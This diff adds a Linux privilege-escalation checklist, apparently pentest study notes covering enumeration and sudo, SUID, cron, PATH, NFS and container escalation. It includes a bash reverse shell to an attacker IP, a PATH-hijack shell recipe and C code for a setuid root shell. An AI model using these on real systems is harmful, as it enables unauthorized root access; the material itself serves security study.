@@ -1,0 +1,174 @@
+**************************************
+|   LINUX PRIV ESCALATION CHECKLIST  |
+**************************************
+
+***************
+| ENUMERATION |
+***************
+
+What's the host we're on? -> "Hostname"
+What's the system info/ kernel? -> "uname -a" (search kernel expoits, if possible)
+What version are we on? -> "cat /proc/version" (what kernel version, is GCC installed, etc.)
+What system version are we on? -> "cat /etc/issue"
+What processes are running? -> "ps -A" / "ps aux"
+What environmental variables are set? -> "env"
+What groups are we a part of? -> "groups"
+What Sudo privs do we have? -> "sudo -l" (check GTFO bins)
+Do we have Read/ Write perms? -> "ls -la"
+What group are we a part of? -> "id"
+Can we see users/ shells? (Unlikely) -> "cat /etc/passwd"
+	Just users -> "cat /etc/passwd | cut -d ":" -f 1" OR "cat /etc/passwd | grep home"
+What's our IP? -> "ifconfig" / "ip route"
+What connections are established?
+	All listening ports/ connections-> "netstat -a"
+	TCP/ UDP ports-> "netstat -at" / "netstat -au"
+	Listening ports ONLY-> "netstat -l"
+	TCP connections w/ service name + PID-> "netstat -tp"
+	Generic 'good enough'-> "netstat -ltp"
+I need to find _____...
+	Executable files-> "find / -perm a=x 2>/dev/null"
+	Files modified in last 10 days-> "find / -mtime 10 2>/dev/null"
+	World-writable folders:
+		"find / -writable -type d 2>/dev/null"
+		"find / -perm -222 -type d 2>/dev/null"
+		"find / -perm -o w -type d 2>/dev/null"
+	World-executable folders:
+		"find / -perm -o x -type d 2>/dev/null"
+	Do we have any compilers available?
+		Perl?-> "find / -name perl* 2>/dev/null"
+		Python?-> "find / -name python* 2>/dev/null"
+		GCC?-> "find / -name gcc* 2>/dev/null"
+	SUID binaries? (GTFO Bins)
+		"find / -perm -u=s -type f 2>/dev/null"
+		"find / -type f -perm -04000 -ls 2>/dev/null"
+What capabilities are set? -> "getcap -r / 2>/dev/null"
+What scheduled tasks are running/ set? -> "cat /etc/cron*"
+What PATH variables are there? -> "echo $PATH"
+What NFS drives are mounted? -> "cat /etc/exports"
+
+*******************
+| KERNEL EXPLOITS |
+*******************
+
+What are they?
+	Kernel exploits are exploits for that particular kernel (similar to an Operating System). They usually get patched, but if a kernel isn't updated, this is still a valid method of attack.
+Use enumeration commands ("uname -a") above to get kernel info, then search www.linuxkernelcves.com/cves or exploitDB, modify as needed
+Ideally you want to compile exploits on the host, but if you must use kali, the following switches are advised for GCC to avoid compile issues:
+-m32 / -m64 -> 32 or 64 bit, respectively.
+-static / -Wl,--hash-style=both -> avoid issues of mismatched glibc variations
+
+Additionally, check if pkexec is vulnerable to CVE-2021-4034: https://github.com/ryaagard/CVE-2021-4034
+Guide: https://www.exploit-db.com/exploits/50689
+
+********
+| SUDO |
+********
+
+What are they?
+	Sometimes Sysadmins mis-set the permissions for users,  and allow them to run certain binaries as "sudo" AKA as admin. This is often a security misconfiguration.
+Check perms w/ "sudo -l" and check GTFO Bins for possible exploits.
+If you see "env_keep+=LD_PRELOAD" option available, know that you can run a shell explot as sudo.
+	More info on this here: https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/
+
+*****************
+| SUID Binaries |
+*****************
+
+What are they?
+	As opposed to 'incorrect sudo perms', the SUID bit can be set on an executable binary that allows it to run ITSELF as sudo, regardless of user.
+Use the above find commands to enumerate any possible SUID binaries on the host system. Check GTFO Bins if an exploit exists!
+These exploits largely vary based on the command with this SUID binary set. For repetition, here's the find commands again:
+	"find / -perm -u=s -type f 2>/dev/null"
+        "find / -type f -perm -04000 -ls 2>/dev/null"
+If you find odd SUID binaries, try running strings on it, and exploiting a PATH vulnerability.
+
+****************
+| CAPABILITIES |
+****************
+
+What are they?
+	Capabilities allow for binaries to perform privileged operations, WITHOUT needing to be run as 'sudo'.
+Capabilities are semi-similar to SUID bits set. They allow a binary to run as sudo under specific user contexts. Think of it as a sysadmin saying "I don't want to put in admin pass every time X user updates Adobe"
+Enumerate the capabilities of available binaries-> "getcap -r / 2>/dev/null"
+Check if the binary on GTFO Bins has a "Capabilities" chapter for it. If so, attempt to exploit.
+
+******************************
+| SCHEDULED TASKS/ CRON JOBS |
+******************************
+
+What are they?
+	Cron jobs are linux's version of scheduled tasks. Sometimes these tasks are run as 'root', and can be exploited if not properly maintained.
+	"cat /etc/cron*"
+Check: can you modify the binaries noted on the crontab? If so, just replace code with a simple reverse shell:
+	"#!/bin/bash
+
+	bash -i >& /dev/tcp/<attacker IP>/<port> 0>&1"
+Sometimes the binaries referenced in the crontab are already removed, but the crontab path to that binary still exists.
+	Check if it's still an available binary: "locate <binary>"
+If the PATH of the binary isn't listed (AKA something like "* * * * * root binaryName.sh", cron refers to PATH variables set for where to check. More info on this below.
+Additionally, try using "PsPy" to see what processes are running, and WHEN! Should help find hidden "cron" jobs.
+
+******************
+| PATH VARIABLES |
+******************
+
+What are they?
+	PATH variables are, in order, where the system checks for binaries if a path is not set. For example on the cronjob above, "binaryName.sh" doesn't have a defined path, so it checks for the binary within the listed PATHs.
+Enumeration:
+	"echo $PATH" ("which <binary>" also tells you where system looks for a given binary)
+Check: do we have WRITE permissions to any folders listed on the PATH variable? Can we modify PATH?
+	If so: "export PATH=/tmp:$PATH" (/tmp can be replaced by any writable directory, just an example)
+	This adds the "/tmp" directory to the START of the PATH variable, so it checks there FIRST.
+Cronjobs can be exploted using this method, if the PATH isn't directly set on the binary. 
+You can also run ./path, among other root binaries, if this isn't securely set.
+
+If you see an SUID binary, try running strings on it. If you see a binary called (w/ or w/o flags), ie "curl -I ....", try creating a local variant:
+	echo "/bin/sh" > /tmp/<binary name>
+	chmod 777 <binary name>
+	export PATH=/tmp:$PATH
+	and try running the SUID binary.
+
+*******
+| NFS |
+*******
+
+What are they?
+	NFS, or Network File Sharing drives, may be misconfigured and have insecure permissions set. This may lead to a possible vector of attack.
+Enumerate the drives with "cat /etc/exports", or "cat /etc/lib/nfs/etab", and see if any drives have "no_root_squash" option enabled. This option, if enabled on a writeable share, allows you to upload an SUID binary to the target system for exploit.
+You can also check (on target machine) for what port NFS is using: "rpcinfo -p" (look for 'nfs')
+	On attacker machine: "showmount -e <IP>"
+			     "mkdir /mountedDriveName"
+			     "mount -o rw <IP>:<drive name> /mountedDriveName"
+Create a simple executable binary w/ SUID bit, and following code (example name "nfs.c"):
+int main()
+{ setgid(0);
+  setuid(0);
+  system("/bin/bash");
+  return 0;
+}
+Compile this code w/ GCC, and set correct permissions:
+	"gcc nfs.c -o nfs -w"
+	"chmod +s nfs"
+Now just run the executable from the target system, should get a root shell.
+
+*********************
+| OUTDATED BINARIES |
+*********************
+
+What are they?
+	Binaries, like everything else, have a version number. Old versions may be vulnerable to use in privilege escalation.
+Example with 'sudo':
+	sudo -V
+Then search exploit-db for <binary> <version #>.
+Searchsploit works as well here.
+
+******************
+| LXD/ LXC GROUP |
+******************
+
+If you have "lxc" or "lxd" group available when you use the "groups" command, you can create an image, and mount it to the local system for root.
+Guide: https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation
+There's also a pre-built image container here in one lower directory. Don't worry about recompiling!
+
+Similarly, for the "docker" group privileges, the ./exploits/docker-privesc/docker-privesc.sh script can be used, assuming the checks both pass.
+Guide: https://flast101.github.io/docker-privesc/
